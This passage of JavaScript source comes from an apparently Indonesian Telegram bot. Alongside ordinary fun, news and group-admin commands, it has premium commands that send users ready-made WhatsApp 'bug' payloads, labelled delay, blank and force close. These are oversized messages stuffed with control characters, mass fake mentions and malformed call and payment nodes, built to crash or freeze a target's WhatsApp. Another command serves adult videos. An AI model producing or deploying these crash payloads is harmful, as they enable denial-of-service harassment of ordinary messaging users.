        const b = names[Math.floor(Math.random() * names.length)];

        await ctx.reply(`💞 Pasangan hari ini: ${a} ❤️ ${b}`);
    } catch (err) {
        console.error("PAIR ERROR:", err);
        ctx.reply("Gagal ngambil data admin.");
    }
});

bot.command('xnxx', checkPremium, async (ctx) => {
  // Kirim pesan loading
  const loadingMsg = await ctx.reply('🔄 Loading video... Tunggu sebentar!');
  
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  const pick = getRandomVideo();
  
  try {
    // Gunakan approach direct URL tanpa download
    await ctx.replyWithVideo(pick.url, {  // Langsung pass URL string, bukan object
      caption: '🎬 Video special untuk kamu!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    // Hapus pesan loading
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim video. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('video_next', async (ctx) => {
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  
  try {
    await ctx.answerCbQuery();
    
    // Kirim loading untuk next
    const loadingMsg = await ctx.reply('🔄 Loading video berikutnya...');
    
    await ctx.deleteMessage(); // Delete message lama
    
    const pick = getRandomVideo();
    await ctx.replyWithVideo(pick.url, {  // Direct URL
      caption: '🎬 Video berikutnya!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading video', { show_alert: true });
  }
});
// ======================= STICKER → URL =====================
bot.command('getfuncdelay', checkPremium, async (ctx) => {
    const id = ctx.from.id;

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) return ctx.reply('⚠️ Format: /createfunc [namafunc] [type]');

    const namafunc = args[0];
    const type = args[1];

    const funcCode =
        `async function ${namafunc}(target, ${namafunc}) {
  const ${namafunc}dellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\\u0003".repeat(92000),
    rows: [{ title: \`\${r + 1}\`, id: \`\${r + 1}\` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\\u0003",
          listType: 2,
          buttonText: null,
          sections: ${namafunc},
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statuSerentributionType: 2,
    },
  };

  const MassageFolware = {
    extendedTextMessage: {
      text: "\\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\\u0003".repeat(500),
      title: "\\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\\u0003",
          body: "\\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => \`\${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net\`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\\u0003".repeat(1770),
      serviceType: 1,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, MassageFolware, {});
  await ${type}.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await ${type}.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ ${namafunc} Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

[ FUNC TYPE DELAY ]`;

    try {
        await ctx.reply('```js\n' + funcCode + '\n```', {
            parse_mode: 'Markdown'
        });
    } catch (e) {
        await ctx.reply('⚠️ Gagal mengirim kode fungsi: ' + e.message);
    }
});

bot.command('getfuncblank', checkPremium, async (ctx) => {
    const id = ctx.from.id;

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) return ctx.reply('⚠️ Format: /getfuncblank [namafunc] [type]');

    const namafunc = args[0];
    const type = args[1];

    const funcCode =
        `async function ${namafunc}(target, Ptcp = true) {
  let pesan = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦾ࣯࣯ Blank By ${namafunc}" + "\u0000".repeat(1000000),
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "null",
                header: "I'm The King Of ${namafunc}",
                body: "👀",
              }),
              buttons: [],
            },
            contextInfo: {
              mentionedJid: [target],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true,
            },
          },
        },
      },
    },
    { quoted: Qcrl }
  );

  await ${type}.relayMessage(
    target,
    pesan.message,
    Ptcp ? { participant: { jid: target, messageId: pesan.key.id } } : {}
  );
  console.log(chalk.blue(" success send bug "));
}

[ FUNC TYPE BLANK ]`;

    try {
        await ctx.reply('```js\n' + funcCode + '\n```', {
            parse_mode: 'Markdown'
        });
    } catch (e) {
        await ctx.reply('⚠️ Gagal mengirim kode fungsi: ' + e.message);
    }
});
bot.command('getfuncfc', checkPremium, async (ctx) => {
    const id = ctx.from.id;

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) return ctx.reply('⚠️ Format: /getfuncfc [namafunc] [type]');

    const namafunc = args[0];
    const type = args[1];

    const funcCode =
        `async function ${namafunc}(${type}, target) {
  try {
    const force = Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 5000) + "@s.whatsapp.net"
    );

    const vc = {
      callMessage: {
        isVideo: true,
        duration: 999999,
        callOutcome: 'missed',
        caption: '${namafunc}'.repeat(1000)
      }
    };
    
    const paymentNode = {
            tag: "payment",
            attrs: {
                id: "PAY-" + Date.now(),
                amount: "9999999999",
                currency: "IDR",
                type: "request"
            }
        };
    
    const bundle = {
      ...force,
      ...vc,
      ...paymentNode
    };

    const out = generateWAMessageFromContent(target, bundle, { userJid: sock.user.id });
    await ${type}.relayMessage(target, out.message, { messageId: out.key.id });
    return true;
  } catch (e) {
    console.error('${namafunc} err:', e);
    return false;
  }
};

[ FUNC TYPE FORCE CLOSE ]`;

    try {
        await ctx.reply('```js\n' + funcCode + '\n```', {
            parse_mode: 'Markdown'
        });
    } catch (e) {
        await ctx.reply('⚠️ Gagal mengirim kode fungsi: ' + e.message);
    }
});
bot.command("cekwa", checkWhatsAppConnection, async (ctx) => {
    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("Format:\n/cekwa 628xxxx");
    }

    const result = await ultraRealChecker(sock, args[1]);

    const msg = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝗩𝗶𝗽𝗲𝗿 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 ⎭ ⊰―—═⬡</pre></blockquote>

⌬ Status      : ${result.status}
⌬ Banned      : ${result.banned}
⌬ Business    : ${result.business}
⌬ Meta Verify : ${result.verified}
⌬ Privacy     : ${result.privacy || "-"}
⌬ Info        : ${result.note}

<blockquote><pre>⚡ @sennsofhopee</pre></blockquote>
`;

    ctx.reply(msg, { parse_mode: "HTML" });
});
bot.command('cekidchannel', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);

    if (!args[0]) {
      return ctx.reply(
        '❌ Masukkan link channel!\n\nContoh:\n/cekidchannel https://whatsapp.com/channel/xxxx'
      );
    }

    const link = args[0].trim();

    if (!link.includes('whatsapp.com/channel/')) {
      return ctx.reply('❌ Link tidak valid!');
    }

    // Ambil kode unik dari link
    const inviteCode = link.split('channel/')[1];

    if (!inviteCode) {
      return ctx.reply('❌ Tidak bisa membaca kode channel!');
    }

    // Ambil metadata dari WA (Baileys)
    const metadata = await conn.newsletterMetadata(inviteCode);

    const channelId = metadata.id;

    await ctx.replyWithMarkdown(
`✅ *CHANNEL DITEMUKAN*

📌 *Nama:* ${metadata.name}
🆔 *ID:* \`${channelId}\`
👥 *Pengikut:* ${metadata.subscribers || 0}

━━━━━━━━━━━━━━━━━━
⚡ Viper Invictus`
    );

  } catch (err) {
    console.log(err);
    ctx.reply('❌ Gagal mengambil data channel.\nPastikan link valid & bot support newsletter.');
  }
});
bot.command('cekfunc', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply || !reply.text) {
    return ctx.reply('⚠️ Balas kode yang mau dicek dulu!');
  }

  const code = reply.text;
  const lines = code.split('\n');

  try {
    new vm.Script(code);

    return ctx.replyWithHTML(
`✅ <b>KODE VALID</b>
━━━━━━━━━━━━━━━━━━
Tidak ditemukan syntax error.`
    );

  } catch (err) {
    const errorMsg = err.message;

    const match = errorMsg.match(/:(\d+):(\d+)/);
    const lineNumber = match ? parseInt(match[1]) : null;
    const columnNumber = match ? parseInt(match[2]) : null;

    let snippet = "Tidak bisa mendeteksi baris.";

    if (lineNumber && lines[lineNumber - 1]) {
      const start = Math.max(0, lineNumber - 2);   // 1 baris sebelum
      const end = Math.min(lines.length, lineNumber + 1); // 1 baris sesudah

      let context = "";

      for (let i = start; i < end; i++) {
        const line = escapeHTML(lines[i]);
        const lineIndex = i + 1;

        if (lineIndex === lineNumber) {
          context += `➜ ${lineIndex}. ${line}\n`;

          if (columnNumber) {
            context += "   " + " ".repeat(columnNumber - 1) + "↑\n";
          }
        } else {
          context += `  ${lineIndex}. ${line}\n`;
        }
      }

      snippet = `<code>${context}</code>`;
    }

    return ctx.replyWithHTML(
`❌ <b>KODE ERROR</b>
━━━━━━━━━━━━━━━━━━
<b>Pesan:</b>
<code>${escapeHTML(errorMsg)}</code>
`
    );
  }
});

bot.command("cektele", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Format: /cektele <id>");

  try {
    const chat = await ctx.telegram.getChat(input);

    ctx.reply(`
📡 STATUS TELEGRAM

🆔 ID: ${chat.id}
👤 Username: ${chat.username ? "@" + chat.username : "Tidak ada"}
📛 Nama: ${chat.first_name || "-"}
📂 Type: ${chat.type}
    `);

  } catch (err) {
    ctx.reply("❌ User tidak ditemukan atau bot tidak punya akses.");
  }
});

bot.command("tofunc", async (ctx) => {
  const chatId = ctx.chat.id;

  const repliedMsg = ctx.message.reply_to_message;
  if (!repliedMsg) {
    return ctx.reply(
      "❌ Reply pesan yang berisi media!",
      { reply_to_message_id: ctx.message.message_id }
    );
  }

  try {
    let fileId, whatsappType;
    const mediaTypes = ["photo", "video", "document", "audio", "sticker"];

    if (!mediaTypes.some(type => repliedMsg[type])) {
      return ctx.reply(
        "❌ Pesan yang dibalas tidak mengandung media!",
        { reply_to_message_id: ctx.message.message_id }
      );
    }

    if (repliedMsg.photo) {
      fileId = repliedMsg.photo.at(-1).file_id;
      whatsappType = "image";
    } else if (repliedMsg.video) {
      fileId = repliedMsg.video.file_id;
      whatsappType = "video";
    } else if (repliedMsg.document) {
      fileId = repliedMsg.document.file_id;
      whatsappType = "document";
    } else if (repliedMsg.audio) {
      fileId = repliedMsg.audio.file_id;
      whatsappType = repliedMsg.audio.mime_type?.startsWith("audio/ogg")
        ? "ptt"
        : "audio";
    } else if (repliedMsg.sticker) {
      fileId = repliedMsg.sticker.file_id;
      whatsappType = "sticker";
    }

    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    let mime = "application/octet-stream";
    if (repliedMsg.document?.mime_type) mime = repliedMsg.document.mime_type;
    if (repliedMsg.video?.mime_type) mime = repliedMsg.video.mime_type;
    if (repliedMsg.audio?.mime_type) mime = repliedMsg.audio.mime_type;
    if (whatsappType === "sticker") {
      mime = repliedMsg.sticker.is_animated
        ? "application/x-tgs"
        : "image/webp";
    }

    const sentMsg = await sock.sendMessage(sock.user.id, {
      [whatsappType]: {
        url: fileUrl,
        mimetype: mime,
      },
    });

    if (!sentMsg?.message) {
      throw new Error("Failed to send media - no response from WhatsApp");
    }

    const messageType = Object.keys(sentMsg.message)[0];
    const media = sentMsg.message[messageType];

    await ctx.reply(
      `\`\`\`js
type: "${messageType}",
url: "${media.url || null}",
directPath: "${media.directPath || null}",
mimetype: "${media.mimetype || null}",
mediaKey: "${media.mediaKey?.toString("base64") || null}",
fileEncSha256: "${media.fileEncSha256?.toString("base64") || null}",
fileSha256: "${media.fileSha256?.toString("base64") || null}",
fileLength: "${media.fileLength || null}",
mediaKeyTimestamp: "${media.mediaKeyTimestamp || null}"
@sennsofhopee
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_to_message_id: ctx.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "「 𝐎𝐰𝐧𝐞𝐫 」",
                url: "https://t.me/sennsofhopee",
              },
            ],
          ],
        },
      }
    );

  } catch (err) {
    console.error("Error in /tofunc:", err);

    let errorMsg = "❌ Gagal mengirim media.";
    if (err.message.includes("not connected")) {
      errorMsg = "❌ WhatsApp session not connected!";
    } else if (err.message.includes("ENOENT")) {
      errorMsg = "❌ File not found on Telegram servers!";
    } else {
      errorMsg += ` Error: ${err.message}`;
    }

    await ctx.reply(errorMsg, {
      reply_to_message_id: ctx.message.message_id,
    });
  }
});
bot.command("tebakangka", (ctx) => {
    const botNumber = Math.floor(Math.random() * 10) + 1;
    const userGuess = parseInt(ctx.message.text.split(" ")[1]);

    if (!userGuess)
        return ctx.reply("Contoh: /tebakangka 7");

    if (userGuess === botNumber) {
        ctx.reply(`🎉 Benar! Angkanya ${botNumber}`);
    } else {
        ctx.reply(`❌ Salah! Angka yang benar ${botNumber}`);
    }
});
bot.command("sultan", (ctx) => {
    const persen = Math.floor(Math.random() * 101);
    ctx.reply(`👑 Aura kesultanan kamu: ${persen}%`);
});
bot.command("toxic", (ctx) => {
    const persen = Math.floor(Math.random() * 101);
    ctx.reply(`☣️ Tingkat toxic kamu: ${persen}%`);
});
bot.command("bomtag", async (ctx) => {
    if (ctx.chat.type === "private") 
        return ctx.reply("Gunakan di grup.");

    const member = ctx.from.first_name;
    ctx.reply(`💣 BOOM! ${member} kena bom fun!`);
});
bot.command("iq", (ctx) => {
    const target = ctx.message.reply_to_message;
    if (!target) return ctx.reply("Reply orang yang mau di cek IQ.");

    const iq = Math.floor(Math.random() * 200);
    ctx.reply(`🧠 IQ dia adalah: ${iq}`);
});         
bot.command("waifu", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url,{caption:"🌸 Waifu (SFW)"}); }
  catch { ctx.reply("❌ Gagal mengambil waifu"); }
});
////========CASE MULTIDEVICE========\\\
bot.command("pinterest", async ctx => {
  const q = ctx.message.text.replace("/pinterest ", "")
  if (!q) return ctx.reply("Format: /pinterest kucing")

  const res = await axios.get(
    "https://id.pinterest.com/search/pins/?q=" + encodeURIComponent(q),
    { headers: { "User-Agent": "Mozilla/5.0" } }
  )

  const img = res.data.match(/https:\/\/i\.pinimg\.com\/originals\/[^"]+/)

  ctx.replyWithPhoto(img[0], { caption: q })
})

bot.command("ig", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply(
      "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/"
    );

  const url = text.trim();

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(
      url
    )}`;

    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data?.result) {
      return ctx.reply("❌ Failed to fetch Instagram media. Please check the URL.");
    }

    const username = data.result.username || "-";

    if (data.result.video) {
      await ctx.replyWithVideo(data.result.video, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else if (data.result.image) {
      await ctx.replyWithPhoto(data.result.image, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else {
      ctx.reply("❌ Unsupported media type from Instagram.");
    }
  } catch (err) {
    console.error("Instagram API Error:", err);
    ctx.reply("❌ Error fetching Instagram media. Please try again later.");
  }
});
bot.command("info", (ctx) => {
  const u = ctx.from;

  const info = `
🪪 <b>Your Profile Info</b>
━━━━━━━━━━━━━━━━━━
👤 Name: ${u.first_name || "-"} ${u.last_name || ""}
🏷 Username: @${u.username || "None"}
🆔 ID: <code>${u.id}</code>
🌐 Language: ${u.language_code || "unknown"}
`;

  ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("gempa", async (ctx) => {
  try {
    const res = await fetch(
      "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json"
    );
    const data = await res.json();
    const g = data.Infogempa.gempa;

    const info = `
📢 *Latest Earthquake (BMKG)*
📅 Date: ${g.Tanggal}
🕒 Time: ${g.Jam}
📍 Location: ${g.Wilayah}
📊 Magnitude: ${g.Magnitude}
📌 Depth: ${g.Kedalaman}
🌊 Potential: ${g.Potensi}
🧭 Coordinates: ${g.Coordinates}
🗺️ Felt: ${g.Dirasakan || "-"}
`;

    await ctx.reply(info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch earthquake data.");
  }
});
bot.command("dunia", async (ctx) => {
  await ctx.reply("🌍 Fetching world news...");

  try {
    const res = await fetch("https://feeds.bbci.co.uk/news/world/rss.xml");
    const xml = await res.text();

    const items = [...xml.matchAll(
      /<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs
    )]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");

    if (!items) throw new Error("No data");

    const message =
      `🌎 *Latest World News*\n\n${items}\n\n📰 _Source: BBC News_`;

    await ctx.reply(message, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch world news.");
  }
});
bot.command("shortlink", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!url) {
    return ctx.reply(
      "🔗 Send the link you want to shorten!\n\nExample:\n`/shortlink https://example.com/very/long/link`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const res = await fetch(
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
    );
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Shorten failed");
    }

    await ctx.reply(
      `✅ *Link shortened!*\n\n🔹 Original: ${url}\n🔹 Short: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Shortlink error:", err);
    ctx.reply("⚠️ Failed to shorten link. Try again later.");
  }
});
bot.command("tagadmin", async (ctx) => {
  const admins = await ctx.getChatAdministrators();
  const names = admins
    .slice(0, 30)
    .map(a => `@${a.user.username || a.user.first_name}`)
    .join(" ");

  ctx.reply(`📢 ${names}`);
});
bot.command("groupinfo", async (ctx) => {
  if (!ctx.chat.title) {
    return ctx.reply("❌ This command is for groups only.");
  }

  const admins = await ctx.getChatAdministrators();

  ctx.reply(
`👥 *Group Info*
📛 Name: ${ctx.chat.title}
🆔 ID: ${ctx.chat.id}
👑 Admins: ${admins.length}
`,
    { parse_mode: "Markdown" }
  );
});
bot.command("logo", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply("🖋️ Example:\n/logo Your Text");
  }

  try {
    const logoUrl =
      `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await ctx.reply(
      `🖋️ Your logo is ready!\nText: *${text}*`,
      { parse_mode: "Markdown" }
    );

    await ctx.replyWithPhoto(logoUrl, {
      caption: "✨ Logo by FlamingText",
    });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to generate logo. Please try again later.");
  }
});
bot.command("pantun", (ctx) => {
  const kategori = (ctx.message.text.split(" ")[1] || "acak").toLowerCase();

  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];
  const daftar = pantun[kategori] || allPantun;
  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  ctx.reply(
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});
const duel = {};

// Tantang duel
bot.command("duel", (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target || !target.startsWith("@")) {
    return ctx.reply("⚠️ Gunakan: /duel @username");
  }

  duel[ctx.chat.id] = target;
  const challenger = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  ctx.reply(`${challenger} menantang ${target}! Gunakan /terima untuk mulai.`);
});

// Terima duel
bot.command("terima", (ctx) => {
  if (!duel[ctx.chat.id]) return;

  const player1 = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const players = [player1, duel[ctx.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];

  ctx.reply(`⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[ctx.chat.id];
});
bot.command("cuaca", async (ctx) => {
  const kota = ctx.message.text.split(" ").slice(1).join(" ");
  if (!kota) return ctx.reply("⚠️ Gunakan: /cuaca <kota>");

  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    ctx.reply(`🌤 Cuaca ${data}`);
  } catch {
    ctx.reply("⚠️ Tidak bisa mengambil data cuaca");
  }
});
bot.command("speed", async (ctx) => {
  const start = Date.now();
  await ctx.reply("⏱ Measuring...");
  const end = Date.now();
  ctx.reply(`⚡ Bot response: ${end - start} ms`);
});

// Command /setrules <teks aturan>
bot.command("setrules", (ctx) => {
  const chatId = ctx.chat.id;
  const rulesText = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!rulesText) {
    return ctx.reply("⚠️ Gunakan:\n/setrules <aturan grup>");
  }

  groupRules[chatId] = rulesText;
  ctx.reply("✅ Group rules have been saved.");
});
bot.command('deploy', checkOwner, async (ctx) => {
    const tokenBaru = ctx.message.text.split(' ')[1];

    if (!tokenBaru) return ctx.reply('⚠️ Mana tokennya, Bosku? \nFormat: /deploy [token]');
    if (daftarBotAnak[tokenBaru]) return ctx.reply('❌ Bot ini sudah jalan, jangan di-deploy dua kali!');

    try {
        // Cek dulu tokennya hidup gak
        const cek = await axios.get(`https://api.telegram.org/bot${tokenBaru}/getMe`);
        const infoBot = cek.data.result;

        // --- PROSES CLONING ---
        const botAnak = new Telegraf(tokenBaru);

        // Copy semua fitur bot UTAMA ke bot ANAK
        botAnak.use(bot.middleware()); 

        // Jalankan bot anak
        botAnak.launch();
        daftarBotAnak[tokenBaru] = infoBot.username;

        const teks = `🚀 <b>BOT BERHASIL DI-DEPLOY!</b> 🚀
━━━━━━━━━━━━━━━━━━━━━━
🤖 <b>Nama:</b> <code>${infoBot.first_name}</code>
🏷️ <b>Username:</b> @${infoBot.username}
🆔 <b>ID:</b> <code>${infoBot.id}</code>
━━━━━━━━━━━━━━━━━━━━━━
✨ <i>Sekarang @${infoBot.username} sudah punya fitur yang sama dengan bot ini!</i>`;

        ctx.reply(teks, { parse_mode: 'HTML' });

    } catch (e) {
        ctx.reply(`❌ <b>GAGAL DEPLOY!</b>\nLog: <code>${e.message}</code>`);
    }
});

// 2. TOOL UNTUK CEK BOT APA SAJA YANG LAGI JALAN
bot.command('listdeploy', checkOwner, async (ctx) => {
    const list = Object.values(daftarBotAnak);
    if (list.length === 0) return ctx.reply('Belum ada bot yang di-deploy.');

    let teks = `📑 <b>DAFTAR BOT AKTIF (${list.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    list.forEach((uname, i) => {
        teks += `${i + 1}. @${uname}\n`;
    });
    ctx.reply(teks, { parse_mode: 'HTML' });
});
// 1. FITUR: HAPUS/MATIKAN SATU BOT DEPLOY
bot.command('deldeploy', checkOwner, async (ctx) => {
    const tokenTarget = ctx.message.text.split(' ')[1];

    if (!tokenTarget) {
        return ctx.reply('⚠️ Mana token yang mau dihapus?\nFormat: /deldeploy [token]');
    }

    if (daftarBotAnak[tokenTarget]) {
        const usernameBot = daftarBotAnak[tokenTarget];
        
        // Menghapus data dari list aktif
        delete daftarBotAnak[tokenTarget];
        
        // Catatan: Di Telegraf, untuk benar-benar menghentikan polling bot anak 
        // yang sedang jalan secara runtime tanpa restart total agak teknis, 
        // tapi dengan menghapus dari daftar ini, bot tersebut tidak akan 
        // merespon perintah baru lagi (tergantung struktur deploy-mu).
        
        ctx.reply(`✅ <b>BERHASIL DIHAPUS!</b>\n━━━━━━━━━━━━━━━━━━━━━━\nBot @${usernameBot} telah dihapus dari daftar deploy.`, { parse_mode: 'HTML' });
    } else {
        ctx.reply('❌ Token tersebut tidak ada dalam daftar bot yang sedang jalan.');
    }
});

// 2. FITUR: MATIKAN SEMUA BOT ANAK (CLEAN UP)
bot.command('stopall', checkOwner, async (ctx) => {
    const jumlah = Object.keys(daftarBotAnak).length;
    
    if (jumlah === 0) {
        return ctx.reply('Operasi gagal, tidak ada bot anak yang sedang jalan.');
    }

    // Mengosongkan objek daftar bot
    daftarBotAnak = {};
    
    ctx.reply(`♻️ <b>CLEAN UP BERHASIL!</b>\n━━━━━━━━━━━━━━━━━━━━━━\nBerhasil menghentikan <b>${jumlah} Bot Anak</b>.\nRAM Panel sekarang lebih lega!`, { parse_mode: 'HTML' });
});
// Command /rules
bot.command("rules", (ctx) => {
  const chatId = ctx.chat.id;
  const rules = groupRules[chatId] || "No rules have been set yet.";

  ctx.reply(
    `📜 *Group Rules:*\n${rules}`,
    { parse_mode: "Markdown" }
  );
});
let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

bot.command("maps", (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");

  if (!query) {
    return ctx.reply("🗺 Example:\n/maps Jakarta");
  }

  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(query)}`;

  ctx.reply(`🗺 Location found:\n${link}`);
});
// ===== MUTE GB =====
bot.command("lock", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    await ctx.setChatPermissions({
        can_send_messages: false
    });
    ctx.reply("🔒 Group dikunci.");
});

bot.command("unlock", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    await ctx.setChatPermissions({
        can_send_messages: true
    });
    ctx.reply("🔓 Group dibuka.");
});
// ===== PIN CHAT=====
bot.command("del", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan bot.");

    try {
        await ctx.deleteMessage(ctx.message.reply_to_message.message_id);
    } catch {
        ctx.reply("Gagal hapus pesan.");
    }
});
// ===== PIN CHAT=====
bot.command("pin", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan yang mau di-pin.");

    await ctx.pinChatMessage(ctx.message.reply_to_message.message_id);
    ctx.reply("Pesan berhasil di pin.");
});
// ===== MUTE/UNMUTE =====
bot.command('mute', async (ctx) => {
